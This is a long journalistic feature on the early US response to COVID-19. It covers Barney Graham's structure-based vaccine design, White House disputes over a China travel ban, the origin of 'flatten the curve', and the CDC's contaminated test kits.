Bookshelves in Graham’s office hold colorful 3-D printouts of viruses that he has worked with, including Ebola, Zika, and influenza. While I was researching “[The End of October]( a novel that I published earlier this year, about a deadly pandemic, Graham helped me design a fictional virus, and then concocted a vaccine for it. As we collaborated, I came to understand that researchers like Graham are essentially puzzle solvers. This past year, he solved one of the most consequential puzzles in modern science. He is the chief architect of the first COVID vaccines authorized for emergency use. Manufactured by Moderna and Pfizer, they differ only in their delivery systems.
On Graham’s wall is a map of Kansas, where he grew up. His father was a dentist and his mother was a teacher. For part of his childhood, they lived on a hog farm. Barney and his brother did much of the farming. Working with the animals, he learned a lot about veterinary medicine. At Rice University, he majored in biology. He earned a medical degree at the University of Kansas, where he met his wife, Cynthia Turner-Graham, a psychiatrist. In 1978, on an infectious-disease rotation in medical school, he spent time at the N.I.H., where he first encountered Fauci. “Cynthia noticed when I came back how excited I was,” Graham recalled. “People were willing to battle each other’s ideas. She thought I would end up here.”
First, he and Cynthia had to complete residencies. They wanted to be in the same town, a problem many professional couples face, but additionally complicated in their case because Cynthia is Black. She suggested Nashville: he could apply to Vanderbilt School of Medicine and she to Meharry Medical College, a historically Black institution. Tennessee had only recently repealed a ban on interracial marriage.
Driving back to Kansas from Maryland on Christmas Eve, Graham stopped in at Vanderbilt. To his surprise, the director of the residency program, Thomas Brittingham, was in his office and willing to meet with him immediately. When the interview was over, Graham told Brittingham, “I know this is the South. I’m going to marry a Black woman, and if that makes a difference I can’t come here.” Brittingham said, “Close the door.” He welcomed Graham on the spot. Cynthia was accepted at Meharry, and so they moved to Nashville.
By 1982, Graham had become the chief resident at Nashville General Hospital. That year, he saw a patient suffering from five simultaneous infections, including cryptococcal meningitis and herpes simplex. It was a mystery: most infections are solitary events. The medical staff was terrified. Graham realized that he was treating Tennessee’s first AIDS patient. “We kept him alive for three weeks,” he said.
Millions of lives would be changed, and so many ended, by this remorseless, elusive disease. Immunology, then a fledgling field, was transformed by the battle. “It took us a couple years just to figure out that H.I.V. was a virus,” Graham said. He started running vaccine trials. “It was not till the mid-nineties that we had decent treatments. There were some really hard years. Almost everyone died.”
In 2000, the N.I.H. recruited Graham to create a vaccine-evaluation clinic. He insisted on keeping a research lab. With space for two dozen scientists, his lab focusses on vaccines for three categories of respiratory viruses: influenza, coronaviruses, and a highly contagious virus called respiratory syncytial virus (RSV), which ended up playing a key role in the development of a COVID vaccine.
RSV causes wheezing pneumonia in children, and sends more kids under five years old to the hospital than any other disease. One of the last childhood infectious diseases without a vaccine, RSV also kills about as many of the elderly as seasonal influenza. It’s wildly infectious. In order to stop its spread in a hospital pediatric ward, staff must wear gloves, masks, and goggles; if any of these items is omitted, RSV will surge. Like COVID, it is dispersed through particle droplets and contaminated surfaces. In the nineteen-sixties, a clinical trial of a potential RSV vaccine made children sicker and led to two deaths—a syndrome called vaccine-enhanced disease. Graham spent much of two decades trying to solve the riddle of what causes RSV, but the technology he needed was still being developed.
In 2008, he had a stroke of luck. Jason McLellan, a postdoc studying H.I.V., had been squeezed out of a structural-biology lab upstairs. H.I.V. has proved invulnerable to a vaccine solution, despite extraordinary technological advances and elegant new theories for designing one. “I thought, Let’s try things out on a more tractable virus,” McLellan recalled. “Barney thought RSV would be perfect for a structure-based vaccine.”

A vaccine trains the immune system to recognize a virus in order to counter it. Using imaging technology, structural biologists can intuit the contours of a virus and its proteins, then reproduce those structures to make more effective vaccines. McLellan said of his field, “From the structure, we can determine function—it’s similar to how seeing a car, with four wheels and doors, implies something about its function to transport people.”
The surface of an RSV particle features a protein, designated F. On the top of the protein, a spot called an epitope serves as a landing pad for antibodies, allowing the virus to be neutralized. But something extraordinary happens when the virus invades a cell. The F protein swells like an erection, burying the epitope and effectively hiding it from antibodies. Somehow, McLellan had to keep the F protein from getting an erection.
Until recently, one of the main imaging tools used by vaccinologists, the cryogenic electron microscope, wasn’t powerful enough to visualize viral proteins, which are incredibly tiny. “The whole field was referred to as blobology,” McLellan said. As a work-around, he developed expertise in X-ray crystallography. With this method, a virus, or even just a protein on a virus, is crystallized, then hit with an X-ray beam that creates a scatter pattern, like a shotgun blast; the structure of the crystallized object can be determined from the distribution of electrons. McLellan showed me an “atomistic interpretation” of the F protein on the RSV virus—the visualization looked like a pile of Cheetos. It required a leap of imagination, but inside that murky world Graham and McLellan and their team manipulated the F protein, essentially by cloning it and inserting mutations that kept it strapped down. McLellan said, “There’s a lot of art to it.”
In 2013, Graham and McLellan published “[Structure-Based Design of a Fusion Glycoprotein Vaccine for Respiratory Syncytial Virus]( in Science, demonstrating how they had stabilized the F protein in order to use it as an antigen—the part of a vaccine that sparks an immune response. Antibodies could now attack the F protein, vanquishing the virus. Graham and McLellan calculated that their vaccine could be given to a pregnant woman and provide enough antibodies to her baby to last for its first six months—the critical period. The paper opened a new front in the war against infectious disease. In a subsequent paper in Science, the team declared that it had established “clinical proof of concept for structure-based vaccine design,” portending “an era of precision vaccinology.” The RSV vaccine is now in Phase III human trials.
In 2012, the mers coronavirus emerged in Saudi Arabia. It was extremely dangerous to work with: a third of infected people died. Ominously, it was the second novel coronavirus in ten years. Coronaviruses have been infecting humans for as long as eight centuries, but before sars and mers they caused only the common cold. It’s possible that, in the distant past, cold viruses were as deadly as COVID, and that humans developed resistance over time.

Like RSV, coronaviruses have a protein that elongates when invading a cell. “It looks like a spike, so we just call it Spike,” Graham said. Spike was large, flexible, and encased in sugars, which made it difficult to crystallize, so X-ray crystallography wasn’t an option. Fortunately, around 2013, what McLellan calls a “resolution revolution” in cryogenic electron microscopy allowed scientists to visualize microbes down to one ten-billionth of a metre. Finally, vaccinologists could truly see what they were doing.
Using these high-powered lenses, Graham and McLellan modified the mers spike protein, creating a vaccine. It worked well in mice. They were on the way to making a version for humans, but, after mers had killed hundreds of people, it petered out as an immediate threat to humans—and the research funding petered out, too. Graham was dismayed, realizing that such a reaction was shortsighted, but he knew that his energies hadn’t been wasted. About two dozen virus families are known to infect humans, and the weapon that Graham’s lab had developed to conquer RSV and mers might be transferrable to many of them.
What was the best way to deliver a modified protein? Graham knew that Moderna, a biotech startup in Cambridge, Massachusetts, had encoded a modified protein on strips of genetic material known as messenger RNA. The company had never brought a vaccine to market, concentrating instead on providing treatments for rare disorders that aren’t profitable enough to interest Big Pharma. But Moderna’s messenger-RNA platform was potent.
In mice, Graham had proved the effectiveness of a structure-based vaccine for mers and also for Nipah, a particularly fatal virus. In 2017, Graham arranged a demonstration project for pandemic preparedness, with mers and Nipah serving as prototypes for a human vaccine using Moderna’s messenger-RNA platform. Almost three years later, as he was preparing to begin human trials for the Nipah vaccine, he heard the news from Wuhan.
Graham called McLellan, who happened to be in Park City, Utah, getting snowboard boots heat-molded to his feet. McLellan had become a star in structural biology, and was recruited to the University of Texas at Austin, where he had access to cryogenic electron microscopes. It took someone who knew Graham well to detect the urgency in his voice. He suspected that China’s cases of atypical pneumonia were caused by a new coronavirus, and he was trying to obtain the genomic sequence. It was a chance to test their concept in a real-world situation. Would McLellan and his team like to get “back in the saddle” and help him create a vaccine?
“Of course,” McLellan said.
“We got the sequences Friday night, the tenth of January,” Graham told me. They had been posted online by the Chinese. “We woke up on the eleventh and started designing proteins.”
Nine days later, the coronavirus officially arrived in America.
Within a day after Graham and McLellan downloaded the sequence for SARS-CoV-2, they had designed the modified proteins. The key accelerating factor was that they already knew how to alter the spike proteins of other coronaviruses. On January 13th, they turned their scheme over to Moderna, for manufacturing. Six weeks later, Moderna began shipping vials of vaccine for clinical trials. The development process was “an all-time record,” Graham told me. Typically, it takes years, if not decades, to go from formulating a vaccine to making a product ready to be tested: the process privileges safety and cost over speed.
Graham had to make several crucial decisions while designing the vaccine, including where to start encoding the spike-protein sequence on the messenger RNA. Making bad choices could render the vaccine less effective—or worthless. He solicited advice from colleagues. Everyone said that the final decisions were up to him—nobody had more experience in designing vaccines. He made his choices. Then, after Moderna had already begun the manufacturing process, the company sent back some preliminary data that made him fear he’d botched the job.
Graham panicked. Given his usual composure, Cynthia, his wife, was alarmed. “It was a crisis of confidence that I just never see in him,” she said. So much depended on the prompt development of a safe and effective vaccine. Graham’s lab was off to a fast start. If his vaccine worked, millions of lives might be spared. If it failed or was delayed, it would be Graham’s fault.
After the vaccine was tested in animals, it became clear that Graham’s design choices had been sound. The first human trial began on March 16th. A week later, Moderna began scaling up production to a million doses per month.
4. “It’s more like 1918”
Since 2016, [Dr. Rick Bright]( has run the Biomedical Advanced Research and Development Authority. A division of H.H.S., the authority is responsible for medical countermeasures in the event of bioterrorism or a pandemic. According to a whistle-blower complaint, on January 22nd Bright received an e-mail from Mike Bowen, an executive at the Texas-based firm Prestige Ameritech, the country’s largest maker of surgical masks. Bowen wrote that he had four “like new” N95 manufacturing lines, which weren’t in use. He added, “Reactivating these machines would be very difficult and very expensive but could be achieved in a dire situation and with government help.” In another message, Bowen wrote, “We are the last major domestic mask company. . . . My phones are ringing now, so I don’t ‘need’ government business. I’m just letting you know that I can help you preserve our infrastructure if things ever get really bad. I’m a patriot first, businessman second.”
Bright had already been worried about the likely shortage of personal protective equipment in the Strategic National Stockpile. He also felt that not enough was being done to develop diagnostics for the virus from Wuhan. On January 23rd, at an H.H.S. leadership meeting with Secretary Alex Azar, he warned that the “virus might already be here—we just don’t have the tests to know.” Many Trump Administration officials seemed determined to ignore scientists who shared bad news.
On January 25th, Bowen wrote Bright again, saying that his company was getting “lots of requests from China and Hong Kong” for masks—a stunning piece of intelligence. About half the masks used in the U.S. come from China; if that supply stopped, Bowen said, American hospitals would run out. Bright continued pushing for immediate action on masks, but he found H.H.S. to be unresponsive. On January 27th, Bowen wrote, “I think we’re in deep shit. The world.”
The same day, at the White House, Matt Pottinger convened an interagency meeting of Cabinet officers and deputies. Attendees fell into four camps. There was the public-health establishment—Redfield, Fauci, Azar—data-driven people who, at the moment, had no data. Another group—the acting White House chief of staff, [Mick Mulvaney]( along with officials from the Office of Management and Budget and the Transportation Department—was preoccupied with the economic damage that would result if drastic steps were taken. A State Department faction was concerned mainly with logistical issues, such as extracting Americans from Wuhan. Finally, there was Pottinger, who saw the virus not just as a medical and economic challenge but also as a national-security threat. He wanted dramatic action now.
For three weeks, the U.S. had been trying unsuccessfully to send medical experts to China. The public-health contingent didn’t want to make decisions about quarantines or travel bans without definitive intelligence, but the Chinese wouldn’t supply it. When Pottinger presented a proposal to curtail travel from China, the economic advisers derided it as overkill. Travel bans upended trade—a serious consideration with China, which, in addition to P.P.E., manufactured much of the vital medicine that the U.S. relied on. Predictably, the public-health representatives were resistant, too: travel bans slowed down emergency assistance, and viruses found ways to propagate no matter what. Moreover, at least fourteen thousand passengers from China were arriving in the U.S. every day: there was no way to quarantine them all. These arguments would join other public-health verities that were eventually overturned by the pandemic. Countries that imposed travel bans with strict quarantines, such as Vietnam and New Zealand, kept the contagion at a manageable level.
The State Department’s evacuation of Americans, particularly diplomatic staff in Wuhan, outraged the Chinese; Tedros Adhanom Ghebreyesus, the director-general of the W.H.O., said that the U.S. was overreacting. In part to placate the Chinese, the 747s that were sent to collect Americans were filled with eighteen tons of P.P.E., including masks, gowns, and gauze. It was a decision that many came to regret—especially when inferior substitutes were later sold back to the U.S., at colossal markups.
The morning after the meeting, Pottinger spoke to a doctor in China who was treating patients. People were getting infected and there was no way to know how and where it happened—a stage of contagion called community spread.
Pottinger asked, “Is this going to be as bad as sars?”
“Don’t think 2003—it’s more like 1918,” the doctor said. That flu lasted two years, and killed between forty and a hundred million people.
On January 28th, the national-security adviser, Robert O’Brien, brought Pottinger into the Oval Office, where the President was getting his daily intelligence briefing. According to contemporaneous notes from someone present at this meeting, the briefer mentioned the virus, but didn’t present it as the top threat. O’Brien warned the President, “This will be the biggest national-security threat you will face.” Trump asked if the outbreak posed as big a danger as sars, and the briefer responded that it wasn’t clear yet.
Pottinger leaped to his feet and recounted what he’d heard from his sources—most shockingly, that more than half the disease’s spread was attributed to asymptomatic carriers. Yet, every day, thousands of people were flying from China to the U.S.
“Should we shut down travel?” Trump asked.
“Yes,” Pottinger advised.
Pottinger left the Oval Office and walked to the Situation Room, where a newly formed Coronavirus Task Force was meeting. People were annoyed with him. “It would be unusual for an asymptomatic person to drive the epidemic in a respiratory disorder,” Fauci said. That certainly had been true of sars. He still wanted U.S. scientists to report from China, in order to get more data. Redfield, of the C.D.C., considered it too early for disruptive actions. He said that there were only a handful of cases outside China, and that in the U.S. the pathogen wasn’t moving that fast. The public-health contingent was united. “Let the data guide us,” they advised.
Pottinger pointed out that the Chinese continued to block such efforts: “We’re not getting data that’s dependable!”
The economic advisers, meanwhile, were frantic—a travel ban would kill the airline industry and shut down the global supply chain. Larry Kudlow, the President’s chief economic adviser, had been questioning the seriousness of the situation. He couldn’t square the apocalyptic forecasts with the stock market. “Is all the money dumb?” he wondered. “Everyone’s asleep at the switch? I just have a hard time believing that.” (Kudlow doesn’t recall making this statement.)
Pottinger, sensing that he’d need backup, had brought along [Peter Navarro]( an abrasive economic adviser who had been part of the trade negotiations with China. Many White House officials considered Navarro to be a crackpot, but he was known to be one of the President’s favorites because he advocated tariff wars and other nationalist measures. Navarro warned the group, “We have got to seal the borders now. This is a black-swan event, and you’re rolling the dice with your gradualist approach.”
Within minutes, Navarro was at odds with everyone in the room. He pointed out that the new virus was spreading faster than the seasonal flu or sars. The possible economic costs and loss of life were staggering. Azar argued that a travel ban would be an overreaction. No progress was made in that meeting, but Navarro was so strident that Mulvaney barred him from future sessions.
Then data surfaced that shifted the argument. In mid-January, a Chicago woman returned from a trip to China. Within a week, she was hospitalized with COVID. On January 30th, her husband, who hadn’t been to China, tested positive. Fauci, Redfield, and others in the public-health contingent changed their minds: human-to-human transmission was clearly happening in America.
Trump was told the news. The timing couldn’t have been worse for him. The bitter trade war he had initiated with China had reached a tentative pause. Since then, he had been praising Xi Jinping’s handling of the contagion, despite evidence of a coverup. A travel ban would reopen wounds. Nevertheless, Trump agreed to announce one the next day.
It was a bold gesture, but incomplete. The Administration blocked non-Americans coming from China, but U.S. citizens, residents, and their family members were free to enter. A two-week quarantine was imposed on travellers coming from the Wuhan region, but, unlike Taiwan, Australia, Hong Kong, and New Zealand, which rigidly enforced quarantines, the U.S. did little to enforce its rules, and the leaks soon became apparent.
5. Flattening the Curve
In 1989, Dr. Howard Markel was in graduate school at Johns Hopkins, specializing in both pediatrics and the history of medicine. He had just lost his wife to cancer, a month after their first anniversary. Markel began volunteering at a local AIDS clinic. He found that helping men his own age who were facing their mortality, or their partner’s, was immensely consoling—“the most spiritually uplifting work I did in my entire clinical career.”

Markel’s patients often asked him, “Doc, do you think I’ll be quarantined because I have H.I.V.?” He’d reply that it wasn’t appropriate for the disease. But, realizing that these men feared being shut away, like victims of leprosy, he began studying “the uses and misuses of quarantine.” His first book was about two epidemics in New York City in 1892, one of typhus and one of cholera, in which Jewish immigrants were blamed for the outbreak and many were sent to quarantine islands.
In the early two-thousands, Markel studied “escape” communities that had essentially closed their doors during the 1918 flu pandemic—among them Gunnison, Colorado, and a school for the blind in Pittsburgh. All had survived the contagion virtually unscathed. In 2006, Markel continued his work on the 1918 flu with Martin Cetron, who now directs the Division of Global Migration and Quarantine, at the C.D.C. For an initiative undertaken by the George W. Bush Administration, Cetron and Markel were asked to help identify the best way to manage the early waves of a pandemic that had no vaccine or treatments. They considered school closures, public-gathering bans, business shutdowns—traditional tools of public health. Markel assembled a dozen researchers—“the Manhattan Project for historians,” he jokes—who combed through more than a hundred archives.
In 1918, Americans faced the same confounding choices as today. Twenty-five cities closed their schools once; fourteen did so twice, and Kansas City three times. More than half the cities were “double-humped”—suffering two waves of the flu. “They raised the bar too early because the natives got restless,” Markel, who is now a professor at the University of Michigan, told me. “They each acted as their own control group. When the measures were on, the cases went down. When the measures were off, the cases went up.” After Philadelphia permitted a Liberty Loans parade, there was a huge uptick in cases. St. Louis, by contrast, cancelled all parades, and local officials broadcast a unified message. The city’s health commissioner published an op-ed alerting citizens to the threat, immediately closing entertainment venues and banning public gatherings. St. Louis’s death rate was half of Philadelphia’s. By quickly imposing several nonpharmaceutical interventions, a city could dramatically lower the peak of infection—on a graph, it would look more like a rainbow than like a skyscraper. Markel compared each intervention to a slice of Swiss cheese; one layer by itself was too riddled with holes to be effective, but multiple layers made a profound difference. “Early, layered, and long” was the formula.
JAMA published [the study]( in 2007. The authors declared, “We found no example of a city that had a second peak of influenza while the first set of nonpharmaceutical interventions were still in effect.” In the century since 1918, technology has transformed so much, but the tools for curbing a novel pandemic haven’t changed. Masks, social distancing, and frequent hand washing remain the only reliable ways to limit contagion until treatments or vaccines emerge.
One night, Markel and Cetron were in Atlanta, talking over their study, and they ordered Thai food. When their dinner arrived, Markel opened his Styrofoam container: instead of a fluffy mound of noodles, he gazed on a level, gelatinous mass. “Look,” Markel said. “They’ve flattened the curve, just like we’re trying to do.” A slogan was born.
6. The Lost February
By January 20th, ten days after the Chinese posted the genetic sequence of SARS-CoV-2, the C.D.C. had created a diagnostic test for it. Secretary Azar reportedly boasted to Trump that it was “the fastest we’ve ever created a test” and promised to have more than a million tests ready within weeks. (Azar denies this.) But the F.D.A. couldn’t authorize it until February 4th. And then everything really went to pieces.
The testing fiasco marked the second failed opportunity America had to control the contagion. The C.D.C. decided to manufacture test kits and distribute them to public-health labs, under the Food and Drug Administration’s Emergency Use Authorization provision. According to Redfield, the C.D.C. published the blueprint for its test, and encouraged the labs to ask the F.D.A. for permission to create their own tests. But Scott Becker, the C.E.O. of the Association of Public Health Laboratories, told me that the labs weren’t made aware of any change in protocol. They kept waiting for the C.D.C. to supply tests, as it had done previously.
At a Coronavirus Task Force meeting, Redfield announced that the C.D.C. would send a limited number of test kits to five “sentinel cities.” Pottinger was stunned: why not send them everywhere? He learned that the C.D.C. makes tests, but not at scale. For that, you have to go to a company like Roche or Abbott—molecular-testing powerhouses that have the experience and the capacity to manufacture millions of tests a month. The C.D.C., Pottinger realized, was “like a microbrewery—they’re not Anheuser-Busch.”
At the time, Azar, a former top executive at the pharmaceutical firm Eli Lilly, led the Coronavirus Task Force. He agreed with Pottinger that test kits needed to be broadly distributed, yet nothing changed. Everyone on the task force understood the magnitude of the crisis; they attended meetings every weekday, with conference calls on weekends. North Korea and Iran didn’t receive such concentrated attention. Yet the Administration was simply not accomplishing tasks crucial to limiting the pandemic. There was a telling disparity between what Azar said in private, or in the task-force meetings, and what he told the President. He was hammering Redfield and the C.D.C. on testing delays while assuring Trump that the crisis was under control.
A bottleneck of constraints imposed by the C.D.C. meant that testing was initially limited to symptomatic patients who had come from China or had been in close contact with an infected person. Even health-care workers who’d developed COVID-like symptoms while treating patients had trouble getting tests, because the C.D.C.’s capacity was so limited.
Pottinger kept in frequent touch with his brother, Paul, the infectious-disease doctor in Seattle.
“You getting enough test kits?” Matt asked him.
“We use none of the C.D.C. kits,” Paul responded. “They have been way too slow in coming.” They also hadn’t been approved for screening asymptomatic patients. Seattle doctors had instead devised a “homemade” diagnostic platform, but their testing capacity was “way less than demand.” Paul was frantically setting up triage procedures—guessing which cases were COVID, and trying to sequester those patients, in order to prevent them from infecting everyone at the hospital.
But there was an even bigger problem.
Microbiologists are acutely aware of the danger of contamination. Viral DNA can linger for hours or days on surfaces, adulterating testing materials. C.D.C. scientists wipe down their instruments every day. Chin-Yih Ou, a Taiwanese microbiologist who retired from the C.D.C. in 2014, told me that while he was creating a test for H.I.V. in infants he refused to let janitors into his lab, mopping the floor himself. In some labs, the last person to leave at night turns on ultraviolet lamps, to kill DNA that might be on the floor or a lab bench. A new pathogen is like an improvised bomb: one wrong decision can be fatal.
The development of the C.D.C.’s test kits was overseen by Stephen Lindstrom, a microbiologist from Saskatchewan, who was known for his ability to function under pressure. C.D.C. scientists began working sixteen-hour days. The C.D.C.’s Biotechnology Core Facility is in charge of producing the components used to detect such pathogens as flu, H.I.V., and sars. To save time, Lindstrom asked the Core Facility to produce both the components and a template of a coronavirus fragment, which would be used to generate the positive control for the C.D.C. test. But, just as the kits were being boxed up to be mailed, a last-minute quality-control procedure found a problem that could cause the tests to fail thirty-three per cent of the time. A decision was made—perhaps by Lindstrom, perhaps by his superiors—to send the kits anyway. According to [ProPublica]( Lindstrom told colleagues, “This is either going to make me or break me.” (The C.D.C. did not make Lindstrom available for comment.)
Almost immediately, public-health labs realized that something was wrong with the kits. The labs are required to do a negative control on the test—for instance, using sterile water—and the tests kept showing false positives.
The C.D.C. test kit had three sets of primers and probes, which are tiny bits of nucleic acid that find a segment of RNA in the virus and replicate it until it gets to a detectable level. Two were aimed at SARS-CoV-2 and a third would detect any coronavirus, in case the virus mutated. The third component failed. Public-health labs figured this out quickly. On their behalf, Scott Becker communicated with the C.D.C. on February 9th, seeking permission to use the test without the third component. “I got radio silence,” he told me. Later, he learned that an internal C.D.C. review showed that it hadn’t passed the quality-control check before the test kit was sent out. “That was a gut punch,” Becker said.
In 2009, Matt Pottinger was in Kabul, in his final deployment as a marine. While walking through a tunnel connected to the U.S. Embassy, he passed a young woman, and then suddenly wheeled around. Her name was Yen Duong. She was working with the Afghan government on improving its H.I.V. testing. “It was, like, seven o’clock at night,” Yen remembers. “He came up to me and asked if I knew where so-and-so’s office was. I was thinking that I’m pretty sure so-and-so’s office is closed right now. It was just a ploy to talk.” Matt and Yen married in 2014.
They have lived very different American lives. He grew up in Massachusetts. His parents divorced when he was young, and he lived mostly with his mother and stepfather. His father, J. Stanley Pottinger, was a lawyer in the Nixon Administration. Matt had an ear for languages, and majored in Mandarin and Japanese at the University of Massachusetts, Amherst, and that is how he found his way to China as a reporter.
Yen was six months old when her family left Vietnam, in 1979, in a boat that her father had secretly built in his sugar factory. At sea, the Duong family—sixty-eight in all—were shot at. A storm nearly capsized the vessel. Pirates robbed them. Finally, the family reached a refugee camp in Indonesia. Six months later, the Duongs were sponsored by four American churches on Long Island, and ended up living in the Hamptons. Yen’s mother cleaned houses and took in sewing, and then found a job in a bakery. Her father painted houses and worked in construction. Eventually, they saved enough money to send Yen to boarding school.
Yen, drawn to science, fell in love with studying viruses. She got a doctorate in pharmacology at the University of California, Davis. In 2007, she became a virologist at the C.D.C., where she developed the global-standard test to measure H.I.V. incidence. None of this would have happened if the family had stayed in Vietnam, if the boat had sunk in the storm, if the pirates had murdered them, or if they hadn’t been taken in by Americans who wanted to help them achieve the opportunities that freedom allowed.
Yen Pottinger, who is now a senior laboratory adviser at Columbia University, told her husband what she thought had gone awry with the test kits. Once the Chinese had posted online the genetic sequence for the virus, Yen explained to Matt, primers would have been easy to design. “It’s a pretty standard task,” she told him. But SARS-CoV-2 is an RNA virus, which is “sticky”—tending to cling to any surface. Contamination was the only plausible explanation for the test kit’s failure. Perhaps a trace amount of the virus template had found its way into the primers and probes. “Contamination has felled many a great scientist,” she said, which is why a pristine lab environment is essential.
On February 10th, the F.D.A. learned that ten labs working with C.D.C. test kits were reporting failures. The C.D.C. assured the F.D.A. that it could quickly fix the problem with the third component. The Trump Administration—in particular, Azar—insisted on continuing with the C.D.C. test kits. Although F.D.A. rules generally require that any procedure granted an Emergency Use Authorization be used exactly as designed, the agency could have allowed public-health labs to use the C.D.C. test kits without the third component, as they were pleading for. The test kits largely worked, even without it, but the F.D.A. says that it didn’t have the data from the C.D.C. to justify that simple solution. The C.D.C. wanted to stick with its original design. Moreover, university scientists, hospital researchers, and commercial labs were eager to develop their own tests, but they were hampered by the bureaucratic challenge of obtaining an Emergency Use Authorization.
On February 12th, the C.D.C. estimated that it would take a week to remanufacture the third component. Six days later, Redfield informed Azar that doing so might take until mid-March. By February 21st, only seven labs in the country could verify that the test worked. Redfield admitted that he had no idea when new test kits might be ready.
On Saturday, February 22nd, the F.D.A. sent Dr. Timothy Stenzel, the director of the Office of In Vitro Diagnostics and Radiological Health, to the C.D.C. to investigate what had gone wrong with the test. When he arrived, there was no one there to receive him, and he was turned away. The next day, he was allowed in the building but forbidden to enter any labs. It was still the weekend. Stenzel made some calls. After he was finally permitted to visit the labs where the test kits were manufactured, he spotted a problem: in one lab, researchers were analyzing patient samples in the same room where testing ingredients were assembled. The tests are so sensitive that even a person walking into the room without changing her lab coat might carry viral material on her clothing that would confound the test. According to [the Wall Street Journal]( an F.D.A. official described the C.D.C. lab as “filthy.” It was the lowest point in the history of a proud institution.
According to an internal F.D.A. account, C.D.C. staff “indicated to Dr. Stenzel that Dr. Stephen Lindstrom—who oversaw a different lab in the manufacturing process—directed them to allow positive and negative control materials to occupy the same physical space of the lab, even though this is a violation of their written protocols.” The clear remedy was to hand over part of the test’s manufacture to two outside contractors. Within a week, tens of thousands of tests were available. But America never made up for the lost February.
I recently asked Redfield, a round-faced man with a white Amish-style beard, how the contamination had occurred and if anyone had been held accountable for the corrupted kits. He replied, vaguely, “One of the newer individuals hadn’t followed protocol.” It also could have been a design flaw that mangled results. Both mistakes might have happened, he conceded. “I wasn’t happy when we did our own internal review,” he said, and acknowledged that the C.D.C. shouldn’t have mass-produced the test kits: “We’re not a manufacturing facility.” He insisted, “At no moment in time was a COVID test not available to public-health labs. You just had to send it to C.D.C.” But the C.D.C. couldn’t process tens of thousands of tests.
The C.D.C. wasn’t entirely responsible for the delay. The F.D.A. might have authorized a version of the test kit without the problematic third component, and loosened the reins on tests developed by other labs. Not until February 26th did the F.D.A. permit public-health labs to use the C.D.C. test kit without the third component. Only on February 29th could other labs proceed with their own tests.
Secretary Azar held the F.D.A. responsible for the absence of alternative tests. A senior Administration official told me, “Instead of being more flexible, the F.D.A. became more regulatory. The F.D.A. effectively outlawed every other COVID test in America.” Stephen Hahn, the F.D.A.’s commissioner, says, “That’s just not correct,” and notes that more than three hundred tests are currently authorized. But there was only one other test by the end of February. Whether the delay was caused mainly by the C.D.C. or the F.D.A., Azar oversaw both agencies.
Without the test kits, contact tracing was stymied; without contact tracing, there was no obstacle in the contagion’s path. America never once had enough reliable tests distributed across the nation, with results available within two days. By contrast, [South Korea]( thanks to universal public insurance and lessons learned from a 2015 outbreak of MERS, provided free, rapid testing and invested heavily in contact tracing, which was instrumental in shutting down chains of infection. The country has recorded some fifty thousand cases of COVID. The U.S. now reports more than four times that number per day.
7. “This is Coming to You”
“One day, it’s like a miracle, it will disappear,” the President told the American people on February 27th. At the time, there were only fifteen known cases of COVID in the U.S., and nearly all involved travellers or people close to them.
As Trump made his promise, a hundred and seventy-five employees of the biotech firm Biogen were heading home from a conference held at a Marriott in Boston. The attendees, many of whom had travelled from other states or foreign countries, had gathered for two days in banquet rooms, shared crowded elevators, and worked out in the gym. Soon, many fell ill.
Researchers affiliated with Massachusetts General Hospital and the Broad Institute of M.I.T. and Harvard believe that sars-CoV-2 was probably introduced to the conference by a single individual. About a hundred people associated with the conference eventually tested positive. The viral strain that they contracted had unusual mutations, allowing researchers to track its spread. In [a recent study]( published in Science, the researchers reported that the Biogen outbreak may have been responsible for three hundred thousand cases in the U.S. alone.
During the study’s initial stages, in February and March, the researchers were discomfited by the implications of their data. “The rapidity and degree of spread suggested it wasn’t a series of one-to-one-to-one transmissions,” Dr. Jacob Lemieux, a lead author, told me. Rather, it was “one-to-many transmission events.” That raised the question of airborne transmission. “At the time, the idea was heretical,” Lemieux said. “We were afraid to consider it, because it implied a whole different approach to infection control”—one in which masks played a central role, especially indoors. But the W.H.O. had repeatedly proclaimed that large respiratory droplets—as from a sneeze or a cough—drove the spread. This wasn’t based on data about the new virus, Lemieux said: “It was received wisdom based on how previous respiratory viruses had behaved. The global public-health infrastructure has egg on its face. There’s a component of human nature that, until you get burned, you don’t know how hot the fire is.”
Vaccines were in development around the world, but Pottinger was hearing that they wouldn’t be available for eighteen months at the earliest. Even that would be a record. A vaccine must be subjected to three trials of increasing size, to determine safety, effectiveness, and proper dosage. Pharmaceutical companies then invest in production, ramping up from thousands of doses to millions.
Pottinger and Navarro, the China-trade adviser, advocated for a way to radically shorten the time frame: companies would be paid to manufacture vaccine candidates that were still in trials and might never be used. If any ended up being successful, Americans could be inoculated in less than a year.
At the end of February, Navarro wrote a memo proposing a three-billion-dollar supplemental budget appropriation to cover the cost of an accelerated vaccine process, P.P.E. for frontline workers, and effective therapeutics. Azar recognized the need for a major budget supplement, but after he met with Mulvaney, Trump’s acting chief of staff, he declared that eight hundred million dollars was enough for now.
Pottinger was apoplectic. The Administration was in denial. There were now more cases outside China than within. Italy and Iran were exploding. And yet Mulvaney and the Office of Management and Budget insisted on viewing the contagion as a kind of nasty influenza that could only be endured. At home, Pottinger fumed to Yen that eight hundred million dollars was half the sum needed just to support vaccine development through Phase III trials.
“Call Debi,” Yen suggested.
Debi was Deborah Birx, the U.S. global AIDS coördinator. In the mid-eighties, as an Army doctor, Birx studied immunology and AIDS at Fauci’s clinic. They walked the hallways together, watching their patients die. Birx then moved to Walter Reed Army Medical Center, where she worked on an H.I.V./AIDS vaccine. At Walter Reed, Birx worked with Redfield. From 2005 to 2014, she led the C.D.C.’s Division of Global H.I.V./AIDS (making her Yen Pottinger’s boss). Birx was known to be effective and data-driven, but also autocratic. Yen described her as “super dedicated,” adding, “She has stamina and she’s demanding, and that pisses people off.” That’s exactly the person Pottinger was looking for.
Birx was in Johannesburg when Pottinger called and asked her to join the Coronavirus Task Force, as its coördinator. She was ambivalent. When she had started her job at the C.D.C., some African countries had H.I.V.-infection rates as high as forty per cent. Through the steady application of public-health measures and the committed collaboration of African governments, the virus’s spread had been vastly reduced. What if she turned her attention and the numbers skyrocketed? Then again, COVID would likely run rampant through the same immune-compromised population she was devoted to protecting. She went to Washington.
As March approached, Secretary Azar had to defend his supplemental budget request before a Senate appropriations subcommittee. Earlier, the senators had been briefed that a grave coronavirus outbreak in the U.S. was likely. Patty Murray, the Democrat from Washington State, was on the committee. “You’ve had a month now to prepare,” she said. “Is our country ready?”
“Our country is preparing every day,” Azar responded.
